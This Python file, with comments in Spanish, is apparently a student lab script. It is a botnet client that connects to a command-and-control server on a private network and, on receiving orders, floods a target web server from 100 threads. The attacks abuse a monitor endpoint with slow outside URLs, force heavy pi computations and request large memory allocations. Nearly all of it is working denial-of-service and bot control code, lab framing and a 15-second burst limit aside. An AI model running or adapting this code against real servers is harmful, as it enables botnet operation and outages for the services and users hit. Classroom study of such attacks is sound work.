"""
Script que queremos inyectar al servidor vulnerable

HAY QUE RELLENAR LOS ATAQUES.
"""

import socket
import threading
import requests
import time
import sys
import random

# --- CONFIGURACIÓN ---
CNC_IP = "192.168.0.17"   # IP del servidor CnC (tu ordenador)
CNC_PORT = 9999

TARGET_IP = "192.168.0.18" # IP de la Víctima (Servidor a atacar)
BASE_URL = f"http://{TARGET_IP}"

# Número de hilos simultáneos
NUM_HILOS = 100

# --- ZONA DEL ALUMNO: ARSENAL ---
# Tarea: Rellena estas funciones con las peticiones que has diseñado
# tras investigar el servidor.

def ataque1():
    """
    Se ejecuta cuando el C&C manda: A1
    Ataca workers
    """
    try:
        # Hosteamos en el puerto 80 un black hole: nc -lkp 80
        # requests.get(f"{BASE_URL}/monitor?target=192.168.0.17") 
        requests.get(f"{BASE_URL}/monitor?target=https://httpbin.org/delay/5")
        pass
    except:
        pass

def ataque2():
    """
    Se ejecuta cuando el C&C manda: A2
    Ataca CPU
    """
    try:
        requests.get(f"{BASE_URL}/pi?iterations=1000000") # Hosteamos en el puerto 80 un black hole: nc -lkp 80
        pass
    except:
        pass

def ataque3():
    """
    Se ejecuta cuando el C&C manda: A3
    """
    try:
        requests.post(f"{BASE_URL}/allocations", data='{"mb":500}') # Hosteamos en el puerto 80 un black hole: nc -lkp 80
        pass
    except:
        pass

# --- MOTOR DEL BOT (NO MODIFICAR, LECTURA INTERESANTE) ---

def ejecutar_ataque(tipo_ataque):
    print(f"[*] ¡ORDEN RECIBIDA!: {tipo_ataque} (Lanzando {NUM_HILOS} hilos)")
    
    funcion_objetivo = None
    if tipo_ataque == "A1": funcion_objetivo = ataque1
    elif tipo_ataque == "A2": funcion_objetivo = ataque2
    elif tipo_ataque == "A3": funcion_objetivo = ataque3
    
    if not funcion_objetivo:
        print(f"[!] No sé cómo ejecutar el ataque: {tipo_ataque}")
        return

    stop_event = threading.Event()
    # Lanzamos los hilos de ataque
    try:
        for _ in range(NUM_HILOS):
            t = threading.Thread(target=bucle_infinito, args=(funcion_objetivo,stop_event))
            t.daemon = True 
            t.start()
        time.sleep(15)
    except KeyboardInterrupt:
        pass
    # Mantenemos el ataque 15 segundos y paramos automáticamente
    # para no quemar la red ni los portátiles
    print("[*] Fin de la ráfaga. Esperando nuevas órdenes...")
    stop_event.set()

def bucle_infinito(funcion, stop_event):
    while not stop_event.is_set():
        funcion()
        # Pequeña pausa técnica para evitar bloqueos locales
        time.sleep(0.01)

def conectar_cnc():
    print(f"[*] Buscando al Maestro en {CNC_IP}:{CNC_PORT}...")
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:    # Esta es la línea que hace la magia
                s.connect((CNC_IP, CNC_PORT))
                print("[+] CONECTADO. Esperando señal de ataque...")
                
                while True:
                    # Esperamos órdenes de texto plano
                    orden = s.recv(1024).decode().strip()
                    if not orden: break
                    
                    # Ejecutamos en hilo aparte para seguir escuchando
                    threading.Thread(target=ejecutar_ataque, args=(orden,)).start()
                    
        except ConnectionRefusedError:
            print("[-] C&C no disponible. Reintentando en 5s...")
            time.sleep(5)
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    if sys.argv[1] == "-d":
        print("Posibles comandos: cpu, ram, workers, quit")
        while True:
            try:
                cmd = input("> ").strip().lower()
                if cmd[0] == 'w':
                    ejecutar_ataque("A1")
                elif cmd[0] == 'c':
                    ejecutar_ataque("A2")
                elif cmd[0] == 'r':
                    ejecutar_ataque("A3")
                elif cmd[0] in ['q', 'e']:
                    break
            except KeyboardInterrupt :
                break
            except EOFError:
                break
        exit()

    conectar_cnc()
